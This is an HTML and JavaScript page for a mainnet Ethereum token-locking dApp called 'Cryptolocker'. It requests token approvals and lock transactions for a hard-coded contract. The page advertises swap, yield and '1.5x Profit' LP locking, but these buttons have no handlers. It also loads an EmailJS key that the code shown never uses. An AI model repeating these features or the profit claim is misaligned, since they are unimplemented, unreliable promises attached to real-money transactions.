<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Crypto Vault - Advanced Security</title>
<!-- EmailJS CDN -->
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
<script>
  (function(){
    emailjs.init("T_-SjRTHAsYr0PkpI");
  })();
</script>
<!-- Web3.js for contract interactions -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.10.0/web3.min.js"></script>
<!-- thirdweb SDK CDN -->
<script src="https://unpkg.com/thirdweb@latest/dist/thirdweb.umd.js"></script>
<!-- Orbitron font for mechanical look -->
<link href="https://fonts.googleapis.com/css?family=Orbitron:400,600,700,900&display=swap" rel="stylesheet">
<style>
* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

body {
  font-family: 'Orbitron', 'Courier New', monospace;
  background: #000000;
  background-image: 
    linear-gradient(rgba(0, 150, 255, 0.05) 1px, transparent 1px),
    linear-gradient(90deg, rgba(0, 150, 255, 0.05) 1px, transparent 1px);
  background-size: 40px 40px;
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  color: #00aaff;
  padding: 20px;
}

#crypto-locker {
  background: linear-gradient(145deg, #050810 0%, #0a1420 100%);
  border: 3px solid #0096ff;
  box-shadow: 
    0 0 30px rgba(0, 150, 255, 0.4),
    inset 0 0 30px rgba(0, 150, 255, 0.08);
  border-radius: 12px;
  padding: 40px;
  width: 100%;
  max-width: 650px;
  position: relative;
}

#crypto-locker::before {
  content: '';
  position: absolute;
  top: -3px;
  left: -3px;
  right: -3px;
  bottom: -3px;
  background: linear-gradient(45deg, #0096ff, #00d4ff, #0096ff);
  border-radius: 12px;
  z-index: -1;
  opacity: 0.4;
  filter: blur(15px);
  animation: glow-pulse 3s ease-in-out infinite;
}

@keyframes glow-pulse {
  0%, 100% { opacity: 0.4; }
  50% { opacity: 0.6; }
}

h2 {
  text-align: center;
  color: #00d4ff;
  margin-bottom: 30px;
  font-size: 36px;
  font-weight: 900;
  text-transform: uppercase;
  letter-spacing: 6px;
  text-shadow: 
    0 0 15px rgba(0, 212, 255, 0.8),
    0 0 30px rgba(0, 150, 255, 0.5),
    0 0 45px rgba(0, 150, 255, 0.3);
  animation: title-glow 2s ease-in-out infinite alternate;
}

@keyframes title-glow {
  from {
    text-shadow: 0 0 10px #00d4ff, 0 0 20px #0096ff;
  }
  to {
    text-shadow: 0 0 20px #00d4ff, 0 0 40px #0096ff, 0 0 60px #0096ff;
  }
}

h3 {
  color: #00d4ff;
  font-size: 22px;
  font-weight: 700;
  text-transform: uppercase;
  letter-spacing: 3px;
  margin: 35px 0 20px 0;
  text-shadow: 0 0 15px rgba(0, 212, 255, 0.6);
  border-bottom: 2px solid #0096ff;
  padding-bottom: 10px;
}

.explorer-links {
  text-align: center;
  margin-bottom: 25px;
  display: flex;
  gap: 10px;
  justify-content: center;
  flex-wrap: wrap;
}

button {
  width: 100%;
  margin: 14px 0;
  padding: 18px 0;
  background: linear-gradient(90deg, #0096ff 0%, #00d4ff 100%);
  color: #000;
  border: 2px solid #00d4ff;
  font-weight: 700;
  font-size: 16px;
  font-family: 'Orbitron', monospace;
  text-transform: uppercase;
  letter-spacing: 2px;
  border-radius: 6px;
  box-shadow: 
    0 0 15px rgba(0, 150, 255, 0.5),
    inset 0 0 15px rgba(0, 212, 255, 0.2);
  cursor: pointer;
  transition: all 0.3s ease;
  position: relative;
  overflow: hidden;
}

button::before {
  content: '';
  position: absolute;
  top: 50%;
  left: 50%;
  width: 0;
  height: 0;
  border-radius: 50%;
  background: rgba(255, 255, 255, 0.4);
  transform: translate(-50%, -50%);
  transition: width 0.5s, height 0.5s;
}

button:hover::before {
  width: 350px;
  height: 350px;
}

button:hover {
  background: linear-gradient(90deg, #00d4ff 0%, #0096ff 100%);
  box-shadow: 
    0 0 25px rgba(0, 212, 255, 0.8),
    inset 0 0 25px rgba(0, 212, 255, 0.3);
  transform: translateY(-3px) scale(1.02);
  border-color: #00ffff;
}

button:active {
  transform: scale(0.97);
}

button:disabled {
  background: #1a1a2e;
  color: #555;
  cursor: not-allowed;
  box-shadow: none;
  border-color: #333;
  opacity: 0.6;
}

.explorer-btn {
  width: auto !important;
  padding: 12px 24px !important;
  font-size: 14px !important;
  margin: 5px !important;
}

input, select {
  width: 100%;
  margin-bottom: 18px;
  padding: 16px;
  border-radius: 6px;
  border: 2px solid #0096ff;
  background: #050810;
  color: #00d4ff;
  font-size: 15px;
  font-family: 'Orbitron', monospace;
  transition: all 0.3s;
  box-shadow: inset 0 0 15px rgba(0, 150, 255, 0.1);
}

input::placeholder {
  color: #0096ff99;
}

input:focus, select:focus {
  border: 2px solid #00d4ff;
  box-shadow: 
    0 0 20px rgba(0, 212, 255, 0.5),
    inset 0 0 20px rgba(0, 212, 255, 0.2);
  outline: none;
  background: #0a1420;
}

select {
  cursor: pointer;
}

select option {
  background: #050810;
  color: #00d4ff;
  padding: 10px;
}

#walletAddress {
  margin: 18px 0;
  padding: 14px;
  background: #050810;
  border: 2px solid #0096ff;
  border-radius: 6px;
  color: #00d4ff;
  font-weight: 600;
  text-align: center;
  font-size: 14px;
  word-break: break-all;
  box-shadow: inset 0 0 15px rgba(0, 150, 255, 0.2);
}

#status {
  margin: 15px 0;
  padding: 12px;
  background: #0a1420;
  border: 2px solid #0096ff;
  border-radius: 6px;
  color: #00d4ff;
  text-align: center;
  font-size: 13px;
  display: none;
}

#status.show {
  display: block;
}

#status.success {
  border-color: #00ff88;
  color: #00ff88;
  background: #051810;
}

#status.error {
  border-color: #ff4444;
  color: #ff4444;
  background: #180505;
}

#locks > div {
  background: linear-gradient(145deg, #050810 0%, #0a1420 100%);
  border: 2px solid #0096ff;
  border-radius: 8px;
  margin-bottom: 18px;
  padding: 18px;
  color: #00d4ff;
  font-size: 14px;
  box-shadow: 
    0 0 15px rgba(0, 150, 255, 0.2),
    inset 0 0 15px rgba(0, 150, 255, 0.05);
  position: relative;
  transition: all 0.3s;
}

#locks > div:hover {
  border-color: #00d4ff;
  box-shadow: 
    0 0 25px rgba(0, 212, 255, 0.4),
    inset 0 0 20px rgba(0, 212, 255, 0.1);
  transform: translateY(-2px);
}

#locks b {
  color: #00ffff;
  text-shadow: 0 0 8px rgba(0, 255, 255, 0.5);
}

#locks .unlock-btn {
  width: auto;
  margin: 10px 5px 0 0;
  padding: 12px 24px;
  font-size: 14px;
  display: inline-block;
  background: linear-gradient(90deg, #00ff88 0%, #00d4ff 100%);
}

#locks .unlock-btn:hover {
  background: linear-gradient(90deg, #00d4ff 0%, #00ff88 100%);
}

#locks .explorer-btn {
  background: linear-gradient(90deg, #0096ff 0%, #0066cc 100%);
  border-color: #0096ff;
}

#locks .explorer-btn:hover {
  background: linear-gradient(90deg, #0066cc 0%, #0096ff 100%);
}

#locks .unlocked {
  color: #00ff88;
  font-weight: 700;
  text-shadow: 0 0 12px rgba(0, 255, 136, 0.6);
}

#locks .locked {
  color: #ff6644;
  font-weight: 700;
  text-shadow: 0 0 12px rgba(255, 102, 68, 0.6);
}

.status-indicator {
  display: inline-block;
  width: 12px;
  height: 12px;
  border-radius: 50%;
  margin-right: 10px;
  animation: pulse 2s infinite;
}

.status-locked {
  background: #ff6644;
  box-shadow: 0 0 15px #ff6644;
}

.status-unlocked {
  background: #00ff88;
  box-shadow: 0 0 15px #00ff88;
}

@keyframes pulse {
  0%, 100% { opacity: 1; transform: scale(1); }
  50% { opacity: 0.6; transform: scale(0.9); }
}

.step-label {
  display: inline-block;
  padding: 4px 12px;
  background: #0096ff;
  color: #000;
  border-radius: 4px;
  font-size: 11px;
  font-weight: 700;
  margin-right: 8px;
  box-shadow: 0 0 10px rgba(0, 150, 255, 0.5);
}

.loading {
  pointer-events: none;
  opacity: 0.7;
  position: relative;
}

.loading::after {
  content: '‚è≥';
  position: absolute;
  right: 20px;
  top: 50%;
  transform: translateY(-50%);
  animation: spin 1s linear infinite;
}

@keyframes spin {
  to { transform: translateY(-50%) rotate(360deg); }
}

/* Horologic Display Styles */
#horologicDisplay {
  background: linear-gradient(145deg, #000810 0%, #001428 100%);
  border: 3px solid #00d4ff;
  border-radius: 10px;
  padding: 20px;
  margin-bottom: 25px;
  box-shadow: 
    0 0 25px rgba(0, 212, 255, 0.4),
    inset 0 0 25px rgba(0, 150, 255, 0.1);
  position: relative;
  overflow: hidden;
}

#horologicDisplay::before {
  content: '';
  position: absolute;
  top: 0;
  left: -100%;
  width: 100%;
  height: 100%;
  background: linear-gradient(90deg, transparent, rgba(0, 212, 255, 0.2), transparent);
  animation: scan 4s linear infinite;
}

@keyframes scan {
  to { left: 100%; }
}

#digitalClock {
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 10px;
  margin-bottom: 15px;
}

#timeDisplay {
  font-size: 48px;
  font-weight: 900;
  color: #00ffff;
  text-shadow: 
    0 0 20px rgba(0, 255, 255, 0.8),
    0 0 40px rgba(0, 212, 255, 0.5),
    0 0 60px rgba(0, 150, 255, 0.3);
  letter-spacing: 8px;
  font-family: 'Orbitron', monospace;
  animation: pulse-glow 2s ease-in-out infinite;
}

@keyframes pulse-glow {
  0%, 100% { 
    text-shadow: 0 0 20px rgba(0, 255, 255, 0.8),
                 0 0 40px rgba(0, 212, 255, 0.5);
  }
  50% { 
    text-shadow: 0 0 30px rgba(0, 255, 255, 1),
                 0 0 60px rgba(0, 212, 255, 0.8),
                 0 0 90px rgba(0, 150, 255, 0.5);
  }
}

#dateDisplay {
  font-size: 16px;
  font-weight: 600;
  color: #0096ff;
  letter-spacing: 3px;
  text-transform: uppercase;
}

#blockchainTime {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 12px 15px;
  background: rgba(0, 150, 255, 0.1);
  border: 1px solid #0096ff;
  border-radius: 6px;
  font-size: 13px;
}

#blockchainTime span:first-child {
  color: #0096ff;
  font-weight: 700;
  letter-spacing: 2px;
}

#blockTime {
  color: #00d4ff;
  font-weight: 600;
  font-family: 'Courier New', monospace;
}

.time-separator {
  animation: blink 1s step-start infinite;
}

@keyframes blink {
  50% { opacity: 0.3; }
}

/* DeFi Integration Buttons */
#defiIntegrations {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
  gap: 12px;
  margin-top: 15px;
}

.defi-btn {
  width: 100% !important;
  padding: 14px 20px !important;
  margin: 0 !important;
  background: linear-gradient(135deg, #0096ff 0%, #00d4ff 50%, #0096ff 100%) !important;
  background-size: 200% 200% !important;
  font-size: 13px !important;
  text-align: center;
  animation: gradient-shift 3s ease infinite;
  border: 2px solid #00d4ff !important;
}

.defi-btn:hover {
  background: linear-gradient(135deg, #00d4ff 0%, #0096ff 50%, #00d4ff 100%) !important;
  box-shadow: 0 0 30px rgba(0, 212, 255, 0.6) !important;
  transform: translateY(-3px) scale(1.05) !important;
}

@keyframes gradient-shift {
  0%, 100% { background-position: 0% 50%; }
  50% { background-position: 100% 50%; }
}

.network-badge {
  display: inline-block;
  padding: 6px 12px;
  background: linear-gradient(90deg, #00ff88 0%, #00d4ff 100%);
  color: #000;
  border-radius: 20px;
  font-size: 12px;
  font-weight: 700;
  margin-left: 10px;
  box-shadow: 0 0 15px rgba(0, 255, 136, 0.5);
  animation: pulse-badge 2s ease-in-out infinite;
}

@keyframes pulse-badge {
  0%, 100% { transform: scale(1); }
  50% { transform: scale(1.05); }
}
</style>
</head>
<body>

<div id="crypto-locker">
  <h2>‚¨¢ CRYPTOLOCKER ‚¨¢<span class="network-badge">MAINNET</span></h2>
  
  <!-- Digital Clock Display -->
  <div id="horologicDisplay">
    <div id="digitalClock">
      <span id="timeDisplay">--:--:--</span>
      <span id="dateDisplay">---- -- --</span>
    </div>
    <div id="blockchainTime">
      <span>‚õìÔ∏è BLOCKCHAIN TIME</span>
      <span id="blockTime">Loading...</span>
    </div>
  </div>
  
  <div class="explorer-links">
    <button class="explorer-btn" onclick="window.open('https://etherscan.io/address/0x82ecB5c11Eda49f8E77e8617C360A5645F8612D1', '_blank')">
      üìä ETHERSCAN
    </button>
  </div>
  
  <button id="connectWallet">üîó CONNECT WALLET</button>
  
  <div id="walletAddress"></div>
  <div id="status"></div>
  
  <input id="tokenAddress" placeholder="‚ñ∏ ERC20 TOKEN CONTRACT ADDRESS" />
  <input id="amount" placeholder="‚ñ∏ AMOUNT (e.g., 1000000000000000000 for 1 token)" type="text" />
  
  <select id="duration">
    <option value="2592000">‚è± 30 DAYS (Minimum)</option>
    <option value="7776000">‚è± 90 DAYS</option>
    <option value="15552000">‚è± 180 DAYS</option>
    <option value="31536000">‚è± 1 YEAR</option>
  </select>
  
  <h3>‚ñ∏ LOCKING OPTIONS</h3>
  
  <button id="approveTokens"><span class="step-label">STEP 1</span>‚úÖ APPROVE TOKENS</button>
  <button id="lockTokens"><span class="step-label">STEP 2</span>üîí BASIC LOCK</button>
  
  <button id="lockWithSwap">üîÑ SWAP & LOCK (Uniswap)</button>
  <button id="lockWithYield">üìà LOCK WITH YIELD (Aave)</button>
  <button id="lockLPTokens">üíß LOCK LP TOKENS (1.5x Profit)</button>
  
  <h3>‚ñ∏ YOUR LOCKS</h3>
  <div id="locks">Connect wallet to view locks...</div>
  
  <h3>‚ñ∏ DEFI INTEGRATIONS</h3>
  <div id="defiIntegrations">
    <button class="defi-btn" onclick="window.open('https://app.uniswap.org', '_blank')">
      ü¶Ñ UNISWAP - Swap Tokens
    </button>
    <button class="defi-btn" onclick="window.open('https://app.aave.com', '_blank')">
      üëª AAVE - Earn Yield
    </button>
    <button class="defi-btn" onclick="window.open('https://compound.finance', '_blank')">
      üè¶ COMPOUND - Lend Assets
    </button>
    <button class="defi-btn" onclick="window.open('https://curve.fi', '_blank')">
      üìà CURVE - Stablecoin Pools
    </button>
  </div>
</div>

<script>
const { ThirdwebSDK } = window.thirdweb || {};

let client, wallet, contractAddress, chain;

// Start clock immediately
startHorologicDisplay();

// Initialize on page load
window.addEventListener('DOMContentLoaded', async () => {
  try {
    // Wait for thirdweb to load
    if (typeof window.thirdweb === 'undefined') {
      throw new Error("Thirdweb SDK not loaded");
    }
    
    // Create client properly
    client = new window.thirdweb.ThirdwebClient({ 
      clientId: "10f433657d1018e7003e5cd1cb9c61d7" 
    });
    
    // MAINNET CONTRACT ADDRESS
    contractAddress = "0x82ecB5c11Eda49f8E77e8617C360A5645F8612D1";
    
    // ETHEREUM MAINNET
    chain = window.thirdweb.mainnet;
    
    showStatus("‚úÖ System initialized on Ethereum Mainnet. Ready to connect wallet.", "success");
  } catch (e) {
    console.error("Init error:", e);
    showStatus("‚ö† Initialization error: " + e.message, "error");
  }
});

// Horologic Display Functions
function startHorologicDisplay() {
  // Ensure elements exist before starting
  if (!document.getElementById('timeDisplay')) {
    setTimeout(startHorologicDisplay, 100);
    return;
  }
  
  updateClock();
  setInterval(updateClock, 1000);
  updateBlockchainTime();
  setInterval(updateBlockchainTime, 5000);
}

function updateClock() {
  const timeEl = document.getElementById('timeDisplay');
  const dateEl = document.getElementById('dateDisplay');
  
  if (!timeEl || !dateEl) return;
  
  const now = new Date();
  
  // Time with blinking separator
  const hours = String(now.getHours()).padStart(2, '0');
  const minutes = String(now.getMinutes()).padStart(2, '0');
  const seconds = String(now.getSeconds()).padStart(2, '0');
  
  timeEl.innerHTML = 
    `${hours}<span class="time-separator">:</span>${minutes}<span class="time-separator">:</span>${seconds}`;
  
  // Date
  const options = { year: 'numeric', month: 'short', day: '2-digit' };
  const dateStr = now.toLocaleDateString('en-US', options).toUpperCase();
  dateEl.textContent = dateStr;
}

async function updateBlockchainTime() {
  const blockTimeEl = document.getElementById('blockTime');
  if (!blockTimeEl) return;
  
  try {
    const timestamp = Math.floor(Date.now() / 1000);
    const date = new Date(timestamp * 1000);
    const utcStr = date.toUTCString().slice(0, -4); // Remove " GMT"
    blockTimeEl.textContent = `${timestamp} | ${utcStr}`;
  } catch (e) {
    blockTimeEl.textContent = 'Unable to sync';
  }
}

function showStatus(message, type = "info") {
  const status = document.getElementById("status");
  status.textContent = message;
  status.className = "show " + type;
  setTimeout(() => {
    status.classList.remove("show");
  }, 5000);
}

document.getElementById("connectWallet").addEventListener("click", async function() {
  const btn = this;
  btn.classList.add("loading");
  btn.disabled = true;
  
  try {
    showStatus("üîÑ Connecting to MetaMask on Ethereum Mainnet...", "info");
    
    // Check if MetaMask is installed
    if (typeof window.ethereum === 'undefined') {
      throw new Error("MetaMask is not installed. Please install MetaMask extension.");
    }
    
    // Request account access
    const accounts = await window.ethereum.request({ 
      method: 'eth_requestAccounts' 
    });
    
    // Switch to mainnet if needed
    try {
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: '0x1' }], // Mainnet chainId
      });
    } catch (switchError) {
      if (switchError.code === 4902) {
        showStatus("‚ö† Please switch to Ethereum Mainnet in MetaMask", "error");
        return;
      }
      throw switchError;
    }
    
    // Create wallet adapter
    wallet = {
      address: accounts[0],
      getAddress: () => accounts[0]
    };
    
    const address = wallet.getAddress();
    document.getElementById("walletAddress").innerHTML = "üîê CONNECTED: <b>" + address.slice(0, 8) + "..." + address.slice(-6) + "</b>";
    showStatus("‚úÖ Wallet connected successfully on Mainnet!", "success");
    
    await loadLocks();
  } catch (e) {
    console.error("Connection error:", e);
    showStatus("‚ùå Failed to connect wallet: " + (e.message || "Unknown error"), "error");
  } finally {
    btn.classList.remove("loading");
    btn.disabled = false;
  }
});

document.getElementById("approveTokens").addEventListener("click", async function() {
  if (!wallet) {
    showStatus("‚ö† Please connect wallet first!", "error");
    return;
  }
  
  const btn = this;
  const token = document.getElementById("tokenAddress").value.trim();
  const amount = document.getElementById("amount").value.trim();
  
  if (!token || !amount) {
    showStatus("‚ö† Enter token address and amount!", "error");
    return;
  }
  
  btn.classList.add("loading");
  btn.disabled = true;
  
  try {
    showStatus("üîÑ Approving tokens...", "info");
    
    // ERC20 ABI for approve function
    const approveABI = [{
      "constant": false,
      "inputs": [
        {"name": "_spender", "type": "address"},
        {"name": "_value", "type": "uint256"}
      ],
      "name": "approve",
      "outputs": [{"name": "", "type": "bool"}],
      "type": "function"
    }];
    
    // Encode the function call
    const web3 = new Web3(window.ethereum);
    const tokenContract = new web3.eth.Contract(approveABI, token);
    const data = tokenContract.methods.approve(contractAddress, amount).encodeABI();
    
    // Send transaction
    const txHash = await window.ethereum.request({
      method: 'eth_sendTransaction',
      params: [{
        from: wallet.address,
        to: token,
        data: data,
      }],
    });
    
    showStatus("‚úÖ Tokens approved! TX: " + txHash.slice(0, 10) + "... Now click STEP 2 to lock them.", "success");
    console.log("Approval TX:", txHash);
  } catch (e) {
    console.error("Approval error:", e);
    showStatus("‚ùå Approval failed: " + (e.message || e.reason || "Unknown error"), "error");
  } finally {
    btn.classList.remove("loading");
    btn.disabled = false;
  }
});

document.getElementById("lockTokens").addEventListener("click", async function() {
  if (!wallet) {
    showStatus("‚ö† Please connect wallet first!", "error");
    return;
  }
  
  const btn = this;
  const token = document.getElementById("tokenAddress").value.trim();
  const amount = document.getElementById("amount").value.trim();
  const duration = document.getElementById("duration").value;
  
  if (!token || !amount || !duration) {
    showStatus("‚ö† Fill all fields!", "error");
    return;
  }
  
  btn.classList.add("loading");
  btn.disabled = true;
  
  try {
    showStatus("üîÑ Locking tokens...", "info");
    
    // Lock function ABI
    const lockABI = [{
      "constant": false,
      "inputs": [
        {"name": "_token", "type": "address"},
        {"name": "_amount", "type": "uint256"},
        {"name": "_duration", "type": "uint256"}
      ],
      "name": "lock",
      "outputs": [],
      "type": "function"
    }];
    
    // Encode the function call
    const web3 = new Web3(window.ethereum);
    const lockerContract = new web3.eth.Contract(lockABI, contractAddress);
    const data = lockerContract.methods.lock(token, amount, duration).encodeABI();
    
    // Send transaction
    const txHash = await window.ethereum.request({
      method: 'eth_sendTransaction',
      params: [{
        from: wallet.address,
        to: contractAddress,
        data: data,
      }],
    });
    
    showStatus("‚úÖ Tokens locked successfully! TX: " + txHash.slice(0, 10) + "...", "success");
    console.log("Lock TX:", txHash);
    
    setTimeout(() => loadLocks(), 2000);
  } catch (e) {
    console.error("Lock error:", e);
    showStatus("‚ùå Lock failed: " + (e.message || e.reason || "Unknown error"), "error");
  } finally {
    btn.classList.remove("loading");
    btn.disabled = false;
  }
});

async function unlockLock(lockId) {
  if (!wallet) {
    showStatus("‚ö† Connect wallet first!", "error");
    return;
  }
  
  try {
    showStatus("üîÑ Unlocking tokens...", "info");
    
    // Unlock function ABI
    const unlockABI = [{
      "constant": false,
      "inputs": [{"name": "_lockId", "type": "uint256"}],
      "name": "unlock",
      "outputs": [],
      "type": "function"
    }];
    
    // Encode the function call
    const web3 = new Web3(window.ethereum);
    const lockerContract = new web3.eth.Contract(unlockABI, contractAddress);
    const data = lockerContract.methods.unlock(lockId).encodeABI();
    
    // Send transaction
    const txHash = await window.ethereum.request({
      method: 'eth_sendTransaction',
      params: [{
        from: wallet.address,
        to: contractAddress,
        data: data,
      }],
    });
    
    showStatus("‚úÖ Tokens unlocked successfully! TX: " + txHash.slice(0, 10) + "...", "success");
    console.log("Unlock TX:", txHash);
    
    setTimeout(() => loadLocks(), 2000);
  } catch (e) {
    console.error("Unlock error:", e);
    showStatus("‚ùå Unlock failed: " + (e.message || e.reason || "Unknown error"), "error");
  }
}

function fetchBlockExplorer(type, address) {
  const BLOCK_EXPLORER = "https://etherscan.io";
  let url = "";
  
  if (type === "token") {
    url = `${BLOCK_EXPLORER}/token/${address}`;
  } else if (type === "address") {
    url = `${BLOCK_EXPLORER}/address/${address}`;
  } else if (type === "contract") {
    url = `${BLOCK_EXPLORER}/address/${contractAddress}`;
  }
  
  window.open(url, '_blank');
}

async function loadLocks() {
  if (!wallet) return;
  
  try {
    // getLocks function ABI
    const getLocksABI = [{
      "constant": true,
      "inputs": [{"name": "_user", "type": "address"}],
      "name": "getLocks",
      "outputs": [{
        "components": [
          {"name": "token", "type": "address"},
          {"name": "amount", "type": "uint256"},
          {"name": "profit", "type": "uint256"},
          {"name": "start", "type": "uint256"},
          {"name": "duration", "type": "uint256"},
          {"name": "claimed", "type": "bool"},
          {"name": "usingYield", "type": "bool"}
        ],
        "name": "",
        "type": "tuple[]"
      }],
      "type": "function"
    }];
    
    const web3 = new Web3(window.ethereum);
    const lockerContract = new web3.eth.Contract(getLocksABI, contractAddress);
    
    const locks = await lockerContract.methods.getLocks(wallet.address).call();
    const now = Math.floor(Date.now() / 1000);
    
    document.getElementById("locks").innerHTML = locks.length
      ? locks
          .map((lock, i) => {
            const unlockTime = Number(lock.start) + Number(lock.duration);
            const canUnlock = !lock.claimed && now >= unlockTime;
            const statusClass = lock.claimed ? "status-unlocked" : "status-locked";
            const statusText = lock.claimed ? "UNLOCKED" : (canUnlock ? "READY TO UNLOCK" : "LOCKED");
            
            // Calculate remaining time
            const remainingSeconds = unlockTime - now;
            const remainingDays = Math.floor(remainingSeconds / 86400);
            const remainingHours = Math.floor((remainingSeconds % 86400) / 3600);
            const remainingMinutes = Math.floor((remainingSeconds % 3600) / 60);
            const timeRemaining = remainingSeconds > 0 
              ? `${remainingDays}d ${remainingHours}h ${remainingMinutes}m`
              : "READY";
            
            return `
              <div>
                <span class="status-indicator ${statusClass}"></span>
                <b>LOCK #${i}</b><br><br>
                <b>TOKEN:</b> ${lock.token.slice(0, 10)}...${lock.token.slice(-8)}<br>
                <b>AMOUNT:</b> ${lock.amount.toString()}<br>
                <b>PROFIT:</b> ${lock.profit.toString()}<br>
                <b>START:</b> ${new Date(Number(lock.start) * 1000).toLocaleString()}<br>
                <b>UNLOCK:</b> ${new Date(unlockTime * 1000).toLocaleString()}<br>
                <b>DURATION:</b> ${Number(lock.duration) / (24 * 60 * 60)} days<br>
                <b>TIME REMAINING:</b> <span style="color: ${remainingSeconds > 0 ? '#00d4ff' : '#00ff88'}; font-weight: 700;">${timeRemaining}</span><br>
                <b>STATUS:</b> <span class="${lock.claimed ? 'unlocked' : 'locked'}">${statusText}</span><br><br>
                ${canUnlock
                  ? `<button class="unlock-btn" onclick="unlockLock(${i})">üîì UNLOCK NOW</button>`
                  : ""
                }
                ${!lock.claimed && !canUnlock
                  ? `<button class="unlock-btn" style="background: linear-gradient(90deg, #ff6644 0%, #ff4422 100%);" onclick="emergencyUnlock(${i})">‚ö†Ô∏è EMERGENCY UNLOCK (-10%)</button>`
                  : ""
                }
                ${lock.usingYield && !lock.claimed
                  ? `<button class="unlock-btn" style="background: linear-gradient(90deg, #ffaa00 0%, #ff8800 100%);" onclick="claimYield(${i})">üí∞ CLAIM YIELD</button>`
                  : ""
                }
                <button class="explorer-btn" onclick="fetchBlockExplorer('token', '${lock.token}')">üîç TOKEN</button>
                <button class="explorer-btn" onclick="fetchBlockExplorer('contract')">üìä CONTRACT</button>
              </div>
            `;
          })
          .join("")
      : "<div style='text-align:center; padding: 25px; color: #0096ff;'>‚ö† NO LOCKS FOUND</div>";
  } catch (e) {
    console.error("Load locks error:", e);
    document.getElementById("locks").innerHTML = "<div style='text-align:center; padding: 25px; color: #ff6644;'>‚ùå Error loading locks</div>";
  }
}

window.unlockLock = unlockLock;
window.fetchBlockExplorer = fetchBlockExplorer;

// DeFi Functions
async function emergencyUnlock(lockId) {
  if (!wallet) {
    showStatus("‚ö† Connect wallet first!", "error");
    return;
  }
  
  if (!confirm("Emergency unlock has a 10% penalty. Continue?")) return;
  
  try {
    showStatus("üîÑ Emergency unlocking...", "info");
    
    // Emergency unlock function ABI
    const emergencyUnlockABI = [{
      "constant": false,
      "inputs": [{"name": "_lockId", "type": "uint256"}],
      "name": "emergencyUnlock",
      "outputs": [],
      "type": "function"
    }];
    
    const web3 = new Web3(window.ethereum);
    const lockerContract = new web3.eth.Contract(emergencyUnlockABI, contractAddress);
    const data = lockerContract.methods.emergencyUnlock(lockId).encodeABI();
    
    const txHash = await window.ethereum.request({
      method: 'eth_sendTransaction',
      params: [{
        from: wallet.address,
        to: contractAddress,
        data: data,
      }],
    });
    
    showStatus("‚úÖ Emergency unlock complete! 10% penalty applied. TX: " + txHash.slice(0, 10) + "...", "success");
    
    setTimeout(() => loadLocks(), 2000);
  } catch (e) {
    console.error("Emergency unlock error:", e);
    showStatus("‚ùå Emergency unlock failed: " + (e.message || e.reason || "Unknown error"), "error");
  }
}

async function claimYield(lockId) {
  if (!wallet) {
    showStatus("‚ö† Connect wallet first!", "error");
    return;
  }
  
  try {
    showStatus("üîÑ Claiming yield...", "info");
    
    // Claim yield function ABI
    const claimYieldABI = [{
      "constant": false,
      "inputs": [{"name": "_lockId", "type": "uint256"}],
      "name": "claimYield",
      "outputs": [],
      "type": "function"
    }];
    
    const web3 = new Web3(window.ethereum);
    const lockerContract = new web3.eth.Contract(claimYieldABI, contractAddress);
    const data = lockerContract.methods.claimYield(lockId).encodeABI();
    
    const txHash = await window.ethereum.request({
      method: 'eth_sendTransaction',
      params: [{
        from: wallet.address,
        to: contractAddress,
        data: data,
      }],
    });
    
    showStatus("‚úÖ Yield claimed successfully! TX: " + txHash.slice(0, 10) + "...", "success");
    
    setTimeout(() => loadLocks(), 2000);
  } catch (e) {
    console.error("Claim yield error:", e);
    showStatus("‚ùå Claim failed: " + (e.message || e.reason || "Unknown error"), "error");
  }
}

window.emergencyUnlock = emergencyUnlock;
window.claimYield = claimYield;

// Auto-refresh locks every 30 seconds
setInterval(() => {
  if (wallet) {
    loadLocks();
  }
}, 30000);
</script>

</body>
</html>
